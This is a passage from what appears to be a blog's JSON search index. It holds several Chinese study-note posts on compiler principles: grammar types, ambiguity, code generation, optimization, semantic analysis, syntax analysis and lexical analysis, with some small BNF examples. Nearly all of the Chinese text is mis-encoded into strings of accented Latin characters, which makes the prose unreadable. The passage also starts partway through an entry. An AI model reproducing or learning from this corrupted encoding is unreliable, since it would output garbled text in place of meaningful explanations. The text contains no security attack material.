æ–‡æ³•ï¼Œä¸Šä¸‹æ–‡æœ‰å…³æ–‡æ³•\næˆ–è€…ä¹Ÿå¯ä»¥å®šä¹‰ä¸ºï¼š\nè¯†åˆ«1å‹è¯­è¨€çš„è‡ªåŠ¨æœºç§°ä¸ºçº¿æ€§ç•Œé™è‡ªåŠ¨æœºï¼ˆLBAï¼‰ 1å‹æ–‡æ³•æ„å‘³ç€ï¼Œå¯¹éç»ˆç»“ç¬¦è¿›è¡Œæ›¿æ¢æ—¶åŠ¡å¿…è€ƒè™‘ä¸Šä¸‹æ–‡ï¼Œå¹¶ä¸”ï¼Œä¸€èˆ¬ä¸å…è®¸æ›¿æ¢æˆsï¼Œé™¤éæ˜¯å¼€å§‹ç¬¦å·äº§ç”ŸÎµ 2å‹æ–‡æ³• ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•\n2å‹æ–‡æ³•å¯¹äº§ç”Ÿå¼çš„è¦æ±‚æ˜¯ï¼šäº§ç”Ÿå¼å·¦éƒ¨ä¸€å®šæ˜¯éç»ˆç»“ç¬¦ï¼Œäº§ç”Ÿå¼å³éƒ¨å¯ä»¥æ˜¯VNã€VTæˆ–Îµï¼›éç»ˆç»“ç¬¦çš„æ›¿æ¢ä¸å¿…è€ƒè™‘ä¸Šä¸‹æ–‡\nè¯†åˆ«2å‹è¯­è¨€çš„è‡ªåŠ¨æœºç§°ä¸ºä¸‹æ¨è‡ªåŠ¨æœºï¼ˆPDAï¼‰\n3å‹æ–‡æ³• æ­£è§„æ–‡æ³•RGã€å·¦/å³çº¿æ€§æ–‡æ³•\n3å‹æ–‡æ³•ä¸­çš„äº§ç”Ÿå¼è¦ä¹ˆå‡æ˜¯å³çº¿æ€§äº§ç”Ÿå¼ï¼Œè¦ä¹ˆæ˜¯å·¦çº¿æ€§äº§ç”Ÿå¼ï¼Œä¸èƒ½æ—¢æœ‰å·¦çº¿æ€§äº§ç”Ÿå¼ï¼Œåˆæœ‰å³çº¿æ€§äº§ç”Ÿå¼ã€‚è‹¥æ‰€æœ‰äº§ç”Ÿå¼å‡æ˜¯å·¦çº¿æ€§ï¼Œåˆ™ç§°ä¸ºå·¦çº¿æ€§æ–‡æ³•ï¼›è‹¥æ‰€æœ‰äº§ç”Ÿå¼å‡æ˜¯å³çº¿æ€§ï¼Œåˆ™ç§°ä¸ºå³çº¿æ€§æ–‡æ³• è¯†åˆ«3å‹è¯­è¨€çš„è‡ªåŠ¨æœºç§°ä¸ºæœ‰é™çŠ¶æ€è‡ªåŠ¨æœºã€‚ æ€»ç»“ iå‹è¯­ ç”±iå‹æ–‡æ³•ç”Ÿæˆçš„è¯­è¨€æˆä¸ºiå‹è¯­è¨€ã€‚ æ³¨æ„ åœ¨è¯æ³•åˆ†æå’Œè¯­æ³•åˆ†æä¸­å¯¹äº§ç”Ÿå¼æœ‰é™åˆ¶\nä¸å­˜åœ¨Pâ†’Päº§ç”Ÿå¼ äº§ç”Ÿå¼ä¸­å‡ºç°çš„ä»»ä½•éç»ˆç»“ç¬¦På¿…é¡»æœ‰ç”¨ æ–‡æ³•çš„ç®€åŒ– åŒä¸€è¯­è¨€å¯ä»¥ç”¨ä¸åŒæ–‡æ³•æ¥æè¿°ï¼Œæ˜¾ç„¶åº”å½“é€‰æ‹©äº§ç”Ÿå¼çš„ä¸ªæ•°æœ€å°‘ï¼Œæœ€ç¬¦åˆè¯­è¨€ç‰¹å¾çš„æ¥æè¿° åœ¨æ–‡æ³•ä¸­ï¼Œæœ‰äº›äº§ç”Ÿå¼å¯¹æ¨å¯¼ä¸èµ·ä½œç”¨ï¼Œè¦åˆ é™¤æ‰ å¦‚æŸä¸ªäº§ç”Ÿå¼åœ¨æ¨å¯¼è¿‡ç¨‹ä¸­æ°¸è¿œä¸ä¼šè¢«ç”¨åˆ°ï¼Œå³ç”±å¼€å§‹ç¬¦å·æ¨å¯¼ï¼Œæ°¸è¿œæ¨ä¸åˆ°çš„å·¦éƒ¨çš„éç»ˆç»“ç¬¦ã€‚ å†å¦‚æ°¸è¿œå¯¼ä¸å‡ºç»ˆç»“ç¬¦ä¸²çš„äº§ç”Ÿå¼ã€‚ å½¢å¦‚Pâ†’\u0026gt;Pçš„äº§ç”Ÿå¼ã€‚ ç®€åŒ–æ­¥éª¤ï¼š\næŸ¥æ‰¾æœ‰æ— å½¢å¦‚P-\u0026gt;Pçš„äº§ç”Ÿå¼ï¼Œè‹¥æœ‰åˆ™åˆ é™¤ï¼› è‹¥æŸä¸ªäº§ç”Ÿå¼åœ¨æ¨å¯¼è¿‡ç¨‹ä¸­æ°¸è¿œä¸ä¼šè¢«ç”¨åˆ°ï¼Œåˆ é™¤å®ƒï¼› è‹¥æŸä¸ªäº§ç”Ÿå¼åœ¨æ¨å¯¼è¿‡ç¨‹ä¸­ä¸èƒ½ä»ä¸­å¯¼å‡ºç»ˆç»“ç¬¦ï¼Œåˆ é™¤å®ƒã€‚ æœ€åï¼Œæ•´ç†æ‰€æœ‰å‰©ä½™äº§ç”Ÿå¼ï¼Œå°±å¾—åˆ°ç®€åŒ–çš„æ–‡æ³•ã€‚\næ–‡æ³•çš„äºŒä¹‰æ€§ å¥å­äºŒä¹‰æ€§ å¦‚æœæ–‡æ³•çš„ä¸€ä¸ªå¥å­å­˜åœ¨å¯¹åº”çš„ä¸¤æ£µæˆ–ä¸¤æ£µä»¥ä¸Šçš„è¯­æ³•æ ‘ï¼Œåˆ™è¯¥å¥å­æ˜¯äºŒä¹‰çš„\næ–‡æ³•äºŒä¹‰æ€§ åŒ…å«äºŒä¹‰æ€§å¥å­çš„æ–‡æ³•æ˜¯äºŒä¹‰æ–‡æ³•\näºŒä¹‰æ€§ä¼šç»™è¯­æ³•åˆ†æå¸¦æ¥ä¸ç¡®å®šæ€§\nä¸å­˜åœ¨ä¸€ä¸ªç®—æ³•èƒ½å¤Ÿåœ¨æœ‰é™çš„æ­¥æ•°å†…ç¡®å®šåˆ¤æ–­ä¸€ä¸ªæ–‡æ³•æ˜¯å¦ä¸ºäºŒä¹‰æ–‡æ³•ï¼Œå³æ–‡æ³•çš„äºŒä¹‰æ€§æ˜¯ä¸å¯åˆ¤å®šçš„\nè¯æ˜æ˜¯äºŒä¹‰æ€§ï¼Œåªéœ€è¦ä¸¾ä¾‹ä¸€ä¸ª\nè‹¥èƒ½æ§åˆ¶æ–‡æ³•çš„äºŒä¹‰æ€§ï¼Œå³åŠ å…¥äººä¸ºçš„é™„åŠ æ¡ä»¶ï¼ˆç¡®å®šä¼˜å…ˆçº§ï¼‰ï¼Œåˆ™äºŒä¹‰æ–‡æ³•çš„å­˜åœ¨å¹¶éåäº‹\nç¬”è€…è®° å½’çº¦æ˜¯æ›´åŠ ç¬¦åˆç¼–è¯‘ç¨‹åºé€»è¾‘çš„è¿‡ç¨‹\n","date":"2024-11-14T14:03:12+08:00","permalink":"https://d4n-sec.github.io/p/compilationprinciplebaseknowledge/","title":"ç¼–è¯‘åŸç†-åŸºæœ¬çŸ¥è¯†"},{"content":"ç›®æ ‡ä»£ç ç”Ÿæˆ ä»»åŠ¡\næŠŠç»è¿‡ä¼˜åŒ–çš„ä¸­é—´ä»£ç è½¬åŒ–æˆç‰¹å®šæœºå™¨ä¸Šçš„ä½çº§è¯­è¨€ä»£ç  ç›®æ ‡ä»£ç çš„å½¢å¼\nç»å¯¹æŒ‡ä»¤ä»£ç ï¼šå¯ç«‹å³æ‰§è¡Œçš„ç›®æ ‡ä»£ç ã€‚ æ±‡ç¼–æŒ‡ä»¤ä»£ç ï¼šæ±‡ç¼–è¯­è¨€ç¨‹åºï¼Œéœ€è¦é€šè¿‡æ±‡ç¼–ç¨‹åºæ±‡ç¼–åæ‰èƒ½è¿è¡Œã€‚ å¯é‡å®šä½æŒ‡ä»¤ä»£ç ï¼šå…ˆå°†å„ç›®æ ‡æ¨¡å—è¿æ¥èµ·æ¥ï¼Œç¡®å®šå˜é‡ã€å¸¸æ•°åœ¨ä¸»å­˜ä¸­çš„ä½ç½®ï¼Œè£…å…¥ä¸»å­˜åæ‰èƒ½æˆä¸ºå¯ä»¥è¿è¡Œçš„ç»å¯¹æŒ‡ä»¤ä»£ç ã€‚ ","date":"2024-11-11T17:15:43+08:00","permalink":"https://d4n-sec.github.io/p/compilationprinciplecodegeneration/","title":"ç¼–è¯‘åŸç†-ç›®æ ‡ä»£ç ç”Ÿæˆ"},{"content":"ä¼˜åŒ– ä»»åŠ¡ å¯¹å‰é¢äº§ç”Ÿçš„ä¸­é—´ä»£ç è¿›è¡ŒåŠ å·¥å˜æ¢ï¼Œä»¥æœŸåœ¨æœ€åé˜¶æ®µèƒ½äº§ç”Ÿæ›´ä¸ºé«˜æ•ˆçš„ç›®æ ‡ä»£ç ã€‚ åŸåˆ™:ç­‰ä»·å˜æ¢ ä¸»è¦å…³æ³¨ï¼šå…¬å…±å­è¡¨è¾¾å¼çš„æå–ã€åˆå¹¶å·²çŸ¥é‡ã€åˆ é™¤æ— ç”¨è¯­å¥ã€å¾ªç¯ä¼˜åŒ–ç­‰ã€‚ å¾ªç¯ä¼˜åŒ–ï¼šå°†å¾ªç¯å†…çš„è¯­å¥ä¼˜åŒ–ä¸ºå¿…éœ€è¯­å¥ ä¼˜åŒ–ä¸¾ä¾‹ ä¸Šå›¾å·¦è¾¹æ˜¯Cè¯­å¥ï¼Œå³è¾¹ä¸ºforå¾ªç¯çš„æ‹†è§£ï¼Œæ ¹æ®å³è¾¹è¯­å¥ç”Ÿæˆä¸­é—´ä»£ç \nä¸­é—´ä»£ç å¦‚ä¸Šï¼Œä¼˜åŒ–ç»“æœå¦‚ä¸‹\nä¼˜åŒ–ç»“æœä¸­å¯ä»¥çœ‹åˆ°ï¼Œä¹˜æ³•æ¶ˆå¤±äº†\nå¦‚æœå¾ªç¯ä¸­åªæœ‰ç¤ºä¾‹ä¸­çš„ä»£ç çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨åŠ æ³•ä¸€æ¬¡æ€§è®¡ç®—ä»£æ›¿å¾ªç¯è®¡ç®—ï¼ˆ+1åˆ°100å˜ä¸º+5050ï¼Œä¾æ—§ç­‰ä»·ï¼‰\n","date":"2024-11-11T16:59:47+08:00","permalink":"https://d4n-sec.github.io/p/compilationprincipleoptimize/","title":"ç¼–è¯‘åŸç†-ä¼˜åŒ–"},{"content":"è¯­ä¹‰åˆ†æå’Œä¸­é—´ä»£ç ç”Ÿæˆ ä»»åŠ¡ å¯¹è¯­æ³•åˆ†æè¯†åˆ«å‡ºçš„å„ç±»è¯­æ³•èŒƒç•´ï¼Œåˆ†æå…¶å«ä¹‰ï¼Œè¿›è¡Œå’Œåˆæ­¥ç¿»è¯‘ï¼Œäº§ç”Ÿä»‹äºæºä»£ç å’Œç›®æ ‡ä»£ç ä¹‹é—´çš„ä¸€ç§ä»£ç ã€‚ åˆ†ä¸ºä¸¤é˜¶æ®µå·¥ä½œï¼š å¯¹æ¯ç§è¯­æ³•èŒƒç•´è¿›è¡Œé™æ€è¯­ä¹‰æ£€æŸ¥ è‹¥è¯­ä¹‰æ­£ç¡®ï¼Œå°±è¿›è¡Œä¸­é—´ä»£ç çš„ç¿»è¯‘ ä¸­é—´ä»£ç  ä¸­é—´ä»£ç å½¢å¼æœ‰ï¼šå››å…ƒå¼ã€ä¸‰å…ƒå¼ã€é€†æ³¢å…°å¼ ä¸­é—´ä»£ç ç”Ÿæˆä¸¾ä¾‹ï¼š\nT3ä¸ºä»€ä¹ˆæ˜¯å·¦æ“ä½œæ•°ï¼Ÿ\n","date":"2024-11-08T19:41:32+08:00","permalink":"https://d4n-sec.github.io/p/semanticanalysis/","title":"ç¼–è¯‘åŸç†-è¯­ä¹‰åˆ†æå’Œä¸­é—´ä»£ç ç”Ÿæˆ"},{"content":" ä»»åŠ¡ åœ¨è¯æ³•åˆ†æçš„åŸºç¡€ä¸Šï¼Œæ ¹æ®è¯­è¨€çš„è¯­æ³•è§„åˆ™ï¼ŒæŠŠå•è¯ç¬¦å·ç»„æˆçš„å„ç±»è¯­æ³•å•ä½ è¯­æ³•è§„åˆ™ è¯­è¨€çš„è§„åˆ™ï¼Œåˆç§°ä¸ºæ–‡æ³•ï¼šè§„å®šå•è¯å¦‚ä½•æ„æˆè¯­æ³•å•ä½ è¯­æ³•å•ä½ è¯­æ³•å•ä½åŒ…æ‹¬ï¼šçŸ­è¯­ã€å­å¥ã€è¯­å¥ã€è¿‡ç¨‹ã€ç¨‹åº è¯­æ³•è§„åˆ™å¦‚ä½•è¡¨ç¤º BNFï¼ˆå·´ç§‘æ–¯èŒƒå¼ï¼‰ï¼šA::=B|C -\u0026gt; è¡¨ç¤ºAå®šä¹‰ä¸ºBæˆ–C è¯­æ³•åˆ†æçš„æ–¹æ³• æ¨å¯¼ï¼ˆDeriveï¼‰å’Œå½’çº¦ï¼ˆReduceï¼‰\næ¨å¯¼\næœ€å·¦æ¨å¯¼ã€æœ€å³æ¨å¯¼ æœ€å³æ¨å¯¼ï¼šæ¯æ¬¡æ¨å¯¼éƒ½æŠŠæœ€å³æ–¹çš„å­—æ¯æŒ‰ç…§è§„åˆ™è½¬åŒ–ä¸ºæ ‡è¯†ç¬¦æˆ–è€…å¸¸é‡ å½’çº¦ï¼ˆæ¨å¯¼çš„é€†è¿‡ç¨‹ï¼‰\næœ€å³å½’çº¦ã€æœ€å·¦å½’çº¦ æœ€å·¦å½’çº¦ï¼šæ¯æ¬¡å½’çº¦éƒ½æŠŠæœ€å·¦æ–¹çš„æ ‡è¯†ç¬¦æˆ–è€…å¸¸é‡æŒ‰ç…§è§„åˆ™è½¬åŒ–ä¸ºå­—æ¯ ä¸¤ä¸ªæ —å­ è¯­æ³•è§„åˆ™ 1 2 3 4 5 6 7 8 9 # å®šä¹‰ V::=æ ‡è¯†ç¬¦ C::=å¸¸æ•° # è§„åˆ™ A::=V=E E::=T|E+T T::=F|T*F F::=V|(E)|C ä¾‹å­ä¸€ ä¸‹å›¾ä¸­ï¼Œç®­å¤´æ–¹å‘æ˜¯æœ€å³æ¨å¯¼ï¼Œç®­å¤´åæ–¹å‘æœ€å·¦å½’çº¦ ä¾‹å­äºŒ ä¸‹å›¾ä¸­ï¼Œç®­å¤´æ–¹å‘æ˜¯æœ€å·¦æ¨å¯¼ï¼Œç®­å¤´åæ–¹å‘æœ€å³å½’çº¦ è¯­æ³•åˆ†æè¿‡ç¨‹ è¯­æ³•åˆ†æè¿‡ç¨‹ä¹Ÿå¯ä»¥ç”¨ä¸€é¢—å€’ç€çš„æ ‘æ¥è¡¨ç¤ºï¼Œè¿™æ£µæ ‘å«è¯­æ³•æ ‘ï¼Œå¦‚ä¸‹\nè§£æè¿‡ç¨‹æ€ç»´å¯¼å›¾ ä»…åšç†è§£ä½¿ç”¨\nè¯­æ³•è§„åˆ™ 1 2 3 4 5 6 7 8 9 # å®šä¹‰ V::=æ ‡è¯†ç¬¦ C::=å¸¸æ•° # è§„åˆ™ A::=V=E E::=T|E+T T::=F|T*F F::=V|(E)|C èµ‹å€¼è¯­å¥ ä¾‹å¦‚var a=b*10ï¼Œå¯ä»¥æŒ‰ç…§è¯­æ³•è§„åˆ™è§£ææ—¶ï¼Œæ€ç»´æµç¨‹å›¾ä¸ºï¼š\nè¯­æ³•è§„åˆ™ä¼šé€’å½’è§£æï¼Œç›´åˆ°å˜æˆæœ€å¼€å§‹çš„å®šä¹‰\næ­¥éª¤ä¸ºï¼š\nåŸå¼å­ å¤„ç†åŸå¼å­çš„è§„åˆ™ å¤„ç†åçš„å­å¼å­ æŒ‰ç…§åˆšæ‰å¤„ç†çš„è§„åˆ™ï¼Œå­å¼å­å¯¹åº”çš„æ‰€å± æŸ¥çœ‹æ‰€å±æ˜¯å¦å¯ä»¥å¯¹åº”ä¸ºå®šä¹‰æˆ–è€…åŒ¹é…ä¸‹ä¸€ä¸ªè§„åˆ™ ç¡®å®šç»“æŸæˆ–è€…ç”¨ä¸‹ä¸€ä¸ªè§„åˆ™å¤„ç† å¦‚æ­¤å¾ªç¯ï¼Œç›´åˆ°æ‰€æœ‰å¼å­å¤„ç†ç»“æŸ\nè¯­æ³•åˆ†æ è¯­æ³•åˆ†æçš„åœ°ä½ï¼šæ˜¯ç¼–è¯‘ç¨‹åºçš„æ ¸å¿ƒéƒ¨åˆ†\nè¯­æ³•åˆ†æç¨‹åºçš„å¤„ç†ï¼šè¯†åˆ«ç”±è¯æ³•åˆ†æå¾—å‡ºçš„å•è¯åºåˆ—æ˜¯å¦æ˜¯ç»™å®šæ–‡æ³•çš„å¥å­ã€‚\nè¯­æ³•åˆ†æçš„ç†è®ºåŸºç¡€ï¼šä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•å’Œä¸‹æ¨è‡ªåŠ¨æœº\nè¯­æ³•åˆ†æçš„æ–¹å¼ï¼š\nè‡ªä¸Šè€Œä¸‹è¯­æ³•åˆ†æåå¤ä½¿ç”¨ä¸åŒäº§ç”Ÿå¼è¿›è¡Œæ¨å¯¼ä»¥è°‹æ±‚ä¸è¾“å…¥ç¬¦å·ä¸²ç›¸åŒ¹é… è‡ªä¸‹è€Œä¸Šè¯­æ³•åˆ†æå¯¹è¾“å…¥ç¬¦å·ä¸²å¯»æ‰¾ä¸åŒäº§ç”Ÿå¼è¿›è¡Œå½’çº¦ç›´åˆ°æ–‡æ³•å¼€å§‹ç¬¦å·ã€‚ è¿™é‡Œæ‰€è¯´çš„è¾“å…¥ç¬¦å·æŒ‡è¯æ³•åˆ†ææ‰€è¯†åˆ«çš„å•è¯ã€‚\nä¸‹æ¨è‡ªåŠ¨æœº ä¸‹æ¨è‡ªåŠ¨æœºæ¨¡å‹å›¾ï¼ˆPDAï¼‰\nPDAå’ŒFAçš„æ¨¡å‹ç›¸æ¯”ï¼Œå¤šäº†ä¸€ä¸ªä¸‹æ¨æ ˆã€‚ PDAçš„åŠ¨ä½œç”±ä¸‰ä¸ªå› ç´ æ¥å†³å®šï¼šå½“å‰çŠ¶æ€ã€è¯»å¤´æ‰€æŒ‡å‘ç¬¦å·ã€ä¸‹æ¨æ ˆæ ˆé¡¶ç¬¦å·ã€‚ ä¸€ä¸ªè¾“å…¥ä¸²èƒ½è¢«PDAæ‰€æ¥å—ï¼Œä»…å½“è¾“å…¥ä¸²è¯»å®Œï¼Œä¸‹æ¨æ ˆå˜ç©ºï¼›æˆ–è¾“å…¥ä¸²è¯»å®Œï¼Œæ§åˆ¶å™¨åˆ°è¾¾æŸäº›ç»ˆæ€ æ­£è§„æ–‡æ³•å’Œæœ‰é™è‡ªåŠ¨æœºä»…é€‚åˆäºæè¿°å’Œè¯†åˆ«é«˜çº§è¯­è¨€çš„å„ç±»å•è¯ï¼Œè¯­å¥å¯ç”¨ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•æ¥æè¿°ï¼Œè€Œä¸‹æ¨è‡ªåŠ¨æœºåˆæ°å¥½èƒ½è¯†åˆ«ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•æ‰€èƒ½æè¿°çš„è¯­è¨€ï¼Œå› æ­¤ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•åŠå…¶å¯¹åº”çš„ä¸‹æ¨è‡ªåŠ¨æœºå°±æˆä¸ºç¼–è¯‘æŠ€æœ¯ä¸­è¯­æ³•åˆ†æçš„ç†è®ºåŸºç¡€ã€‚ è‡ªä¸Šè€Œä¸‹åˆ†ææ³• å®šä¹‰ï¼šä»æ–‡æ³•çš„å¼€å§‹ç¬¦å·å¼€å§‹ï¼Œåå¤ä½¿ç”¨ä¸åŒäº§ç”Ÿå¼è¿›è¡Œæ¨å¯¼ä»¥è°‹æ±‚ä¸è¾“å…¥ç¬¦å·ä¸²ç›¸åŒ¹é…ã€‚\næ­¤å¤„çš„è¾“å…¥ç¬¦å·ä¸²æ˜¯æŒ‡è¯æ³•åˆ†æç»“æœçš„ä¸€ä¸²äºŒå…ƒå¼\nä¸€èˆ¬æ–¹æ³•ï¼š\nè¯•æ¢æ³•ï¼šå¸¦å›æº¯çš„è‡ªä¸Šè€Œä¸‹åˆ†ææ³•ã€‚\nç¼ºé™·ï¼š\nå¦‚æœæ–‡æ³•å­˜åœ¨å·¦é€’å½’ï¼Œè¯­æ³•åˆ†æä¼šæ— é™å¾ªç¯ä¸‹å»ã€‚ï¼ˆåˆ†ä¸ºç›´æ¥å’Œé—´æ¥å·¦é€’å½’ï¼Œå¯ä»¥æ¶ˆé™¤å·¦é€’å½’ï¼‰\nè‹¥äº§ç”Ÿå¼å­˜åœ¨å¤šä¸ªå€™é€‰å¼ï¼Œé€‰æ‹©å“ªä¸ªè¿›è¡Œæ¨å¯¼å®Œå…¨æ˜¯ç›²ç›®çš„ã€‚ï¼ˆé¢„æµ‹ä¸æå·¦å› å­ï¼‰\nå›æº¯ä¼šå¼•èµ·æ—¶é—´å’Œç©ºé—´çš„å¤§é‡æ¶ˆè€—ã€‚ï¼ˆå¯ä»¥æ¶ˆé™¤å›æº¯ï¼Œéç›²ç›®é€‰æ‹©å³å¯æ¶ˆé™¤å›æº¯ï¼‰\nå¦‚æœè¢«è¯†åˆ«çš„è¯­å¥æ˜¯é”™çš„ï¼Œç®—æ³•æ— æ³•æŒ‡å‡ºé”™è¯¯çš„ç¡® åˆ‡ä½ç½®ã€‚\nå¸¦é¢„æµ‹åˆ†æçš„PDA åœ¨PDAä¸­åŠ å…¥é¢„æµ‹åˆ†æä¹‹åï¼Œå¯ä»¥æ¶ˆé™¤è‡ªä¸Šè€Œä¸‹åˆ†æä¸­å‡ºç°å›æº¯çš„ç°è±¡ã€‚æ­¤æ—¶PDAå¯ä»¥æ”¹é€ ä¸ºï¼š\næ”¹é€ åï¼Œæ•´ä¸ªåˆ†æè¿‡ç¨‹éƒ½åœ¨é¢„æµ‹åˆ†æç¨‹åºæ§åˆ¶ä¸‹å·¥ä½œã€‚ é¢„æµ‹åˆ†æç¨‹åºç”¨äº†ä¸€ä¸ªé¢„æµ‹åˆ†æè¡¨ï¼Œå®ƒæ˜¯é¢„æµ‹åˆ†æç¨‹åºåˆ†ææ—¶çš„ä¸»è¦ä¾æ®ã€‚ é¢„æµ‹åˆ†æè¡¨æ˜¯ä¸€çŸ©é˜µM[A,a]ï¼Œå…¶ä¸­è¡Œæ ‡Aæ˜¯éç»ˆç»“ç¬¦ï¼Œåˆ—æ ‡aæ˜¯ç»ˆç»“ç¬¦æˆ–ä¸²ç»“æŸç¬¦;çŸ©é˜µå…ƒç´ M[A,a]æ˜¯å­˜æ”¾Açš„ä¸€ä¸ªå€™é€‰å¼ï¼ŒæŒ‡å‡ºå½“å‰æ ˆé¡¶ç¬¦å·ä¸ºAä¸”é¢ä¸´è¯»å…¥ç¬¦å·ä¸ºaæ—¶åº”é€‰çš„å€™é€‰å¼ï¼›æˆ–è€…å­˜æ”¾â€œå‡ºé”™æ ‡å¿—â€ï¼ŒæŒ‡å‡ºAä¸è¯¥é¢ä¸´è¯»å…¥ç¬¦å·aã€‚\n","date":"2024-11-08T17:13:30+08:00","permalink":"https://d4n-sec.github.io/p/grammaranalysis/","title":"ç¼–è¯‘åŸç†-è¯­æ³•åˆ†æ"},{"content":"å…³äº ä»»åŠ¡\nè¾“å…¥æºç¨‹åºï¼Œå¯¹æ„æˆæºç¨‹åºçš„å­—ç¬¦ä¸²è¿›è¡Œæ‰«æå’Œåˆ†è§£ï¼Œè¯†åˆ«å‡ºä¸€ä¸ªä¸ªçš„å•è¯ è¯æ³•åˆ†æä¾ç…§è¯æ³•è§„åˆ™ï¼Œè¯†åˆ«å‡ºæ­£ç¡®çš„å•è¯ï¼Œè½¬æ¢ä¸ºç»Ÿä¸€è§„æ ¼ï¼Œå¤‡ç”¨ å•è¯\né«˜çº§è¯­è¨€ä¸­æœ‰å®åœ¨æ„ä¹‰çš„æœ€å°è¯­æ³•å•ä½ï¼Œå­—ç¬¦ç»„æˆï¼ˆå…³é”®å­—ï¼Ÿï¼‰ åŒ…æ‹¬ï¼š åŸºæœ¬å­—ï¼švoid int floatç­‰ æ ‡è¯†ç¬¦ï¼šå˜é‡åï¼Œå‡½æ•°åç­‰ æ•´å¸¸æ•°ï¼šä¾‹å¦‚ a*50 ä¸­çš„50 è¿ç®—ç¬¦ï¼š+ - * / =ç­‰ ç•Œé™ç¬¦ï¼š{} '' ; ()ç­‰ è½¬æ¢\nå¯¹åŸºæœ¬å­—ã€è¿ç®—ç¬¦ã€ç•Œé™ç¬¦çš„è½¬æ¢ æ ‡è¯†ç¬¦çš„è½¬æ¢ å¸¸æ•°çš„è½¬æ¢ è½¬æ¢å®Œæˆåçš„æ ¼å¼ï¼šï¼ˆç±»å·ï¼Œå†…ç ï¼‰ æè¿°è¯æ³•è§„åˆ™çš„æœ‰æ•ˆå·¥å…·æ˜¯æ­£è§„å¼å’Œæœ‰é™è‡ªåŠ¨æœº\nè¯æ³•åˆ†æ ç¼–è¯‘çš„ç¬¬ä¸€é˜¶æ®µï¼Œåœ¨å•è¯çš„çº§åˆ«ä¸Šåˆ†æå’Œç¿»è¯‘æºç¨‹åºã€‚\nç†è®ºåŸºç¡€ æœ‰é™è‡ªåŠ¨æœºç†è®º æœ‰é™è‡ªåŠ¨æœºç†è®ºä¸æ­£è§„æ–‡æ³•ã€æ­£è§„å¼ä¹‹é—´åœ¨æè¿°è¯­è¨€æ–¹é¢æœ‰ä¸€ä¸€å¯¹åº”çš„å…³ç³»ã€‚ æ­£è§„é›† ç”±æ­£è§„æ–‡æ³•äº§ç”Ÿçš„è¯­è¨€\næ­£è§„é›†æ˜¯é›†åˆï¼Œå¯æœ‰ç©·ä¹Ÿå¯æ— ç©·ã€‚å¯é€šè¿‡æ­£è§„å¼æ¥å½¢å¼åŒ–è¡¨ç¤ºã€‚\næ­£è§„å¼ è¯¶ï¼Œè›™è¶£ï¼Œç¬”è€…è¢«åšæ‰äº†ï¼Œæ­£è§„æ–‡æ³•ï¼Œæ­£è§„å¼ï¼Œæ­£è§„é›†å‚»å‚»åˆ†ä¸æ¸…æ¥šã€‚\u0026ndash;TODO\u0026ndash;\næœ‰é™è‡ªåŠ¨æœº æœ‰é™è‡ªåŠ¨æœºæ˜¯ä¸€ç§è¯†åˆ«è£…ç½®ï¼Œå®ƒèƒ½å‡†ç¡®åœ°è¯†åˆ«æ­£è§„é›†ã€‚å®ƒä¸ºè¯æ³•åˆ†æç¨‹åºçš„æ„é€ æä¾›äº†æ–¹æ³•å’Œå·¥å…·ã€‚\næœ‰é™è‡ªåŠ¨æœºæ˜¯å…·æœ‰ç¦»æ•£è¾“å…¥è¾“å‡ºç³»ç»Ÿçš„æ•°å­¦æ¨¡å‹ï¼Œå®ƒå…·æœ‰æœ‰é™æ•°ç›®çš„å†…éƒ¨çŠ¶æ€ï¼Œç³»ç»Ÿå¯ä»¥æ ¹æ®å½“å‰æ‰€å¤„çš„çŠ¶æ€å’Œé¢ä¸´çš„è¾“å…¥å­—ç¬¦å†³å®šç³»ç»Ÿçš„åç»§è¡Œä¸ºã€‚å…¶å½“å‰çŠ¶æ€æ¦‚æ‹¬äº†è¿‡å»è¾“å…¥å¤„ç†çš„ä¿¡æ¯ã€‚\nåŸºæœ¬æ¨¡å‹\nåŒ…å«ç¡®å®šçš„æœ‰é™çŠ¶æ€è‡ªåŠ¨æœº DFA å’Œ ä¸ç¡®å®šçš„æœ‰é™çŠ¶æ€è‡ªåŠ¨æœº NFA\nè€ƒè¯•è€ƒç‚¹å¦‚ä¸‹ï¼Œç¬”è€…ç”¨ä¸ç€ï¼Œä¸å­¦\nNFAç¡®å®šåŒ– æœ‰é™çŠ¶æ€è‡ªåŠ¨æœºçš„ç®€åŒ–\næœ‰é™çŠ¶æ€è‡ªåŠ¨æœºå¯ä»¥å’Œæ­£è§„å¼äº’ç›¸è½¬åŒ–ï¼Œæ­£å‘æ˜¯ç®€åŒ–ï¼Œåå‘æ˜¯åˆ†è£‚\nè¯æ³•åˆ†æç¨‹åº æ‰«ææºç¨‹åºå­—ç¬¦ä¸²ï¼ŒæŒ‰ç…§è¯æ³•è§„åˆ™è¯†åˆ«å‡ºä¸€ä¸ªä¸ªæ­£ç¡®çš„å•è¯ï¼Œå¹¶è½¬æ¢ä¸ºç›¸åº”çš„äºŒå…ƒå¼å½¢å¼ï¼ˆç±»å·ï¼Œå†…ç ï¼‰ï¼Œäº¤ç»™è¯­æ³•åˆ†æä½¿ç”¨ã€‚\né¢„å¤„ç† æºç¨‹åºä¸­åŒ…å«æ³¨è§£éƒ¨åˆ†ï¼Œè¿˜æœ‰æ— ç”¨çš„ç©ºæ ¼ã€è·³æ ¼ã€å›è½¦æ¢è¡Œç­‰ç¼–è¾‘å­—ç¬¦ï¼Œå®ƒä»¬ä¸è¯æ³•åˆ†ææ— å…³ã€‚ ä¸€è¡Œè¯­å¥ç»“æŸåº”é…ä¸Šä¸€ä¸ªç‰¹æ®Šå­—ç¬¦è¯´æ˜ã€‚ æœ‰äº›è¯­è¨€è¦è¯†åˆ«æ ‡å·åŒºï¼ŒåŒºåˆ†æ ‡å·è¯­å¥ï¼Œæ‰¾å‡ºç»­è¡Œç¬¦è¿æ¥æˆå®Œæ•´è¯­å¥ç­‰ã€‚ è¾“å‡ºæºç¨‹åºæ¸…å•ä»¥ä¾¿å¤æ ¸ã€‚ é¢„å¤„ç†ç¨‹åºä»»åŠ¡ï¼š ä»è¾“å…¥ç¼“å†²åŒºä¸­è¯»å–æºç¨‹åºï¼Œé¢„å¤„ç†åé€å…¥æ‰«æç¼“å†²åŒºã€‚æ­¤æ—¶ï¼Œæ‰«æç¼“å†²åŒºä¸­çš„å­—ç¬¦éƒ½æ˜¯æœ‰æ•ˆå­—ç¬¦ã€‚ 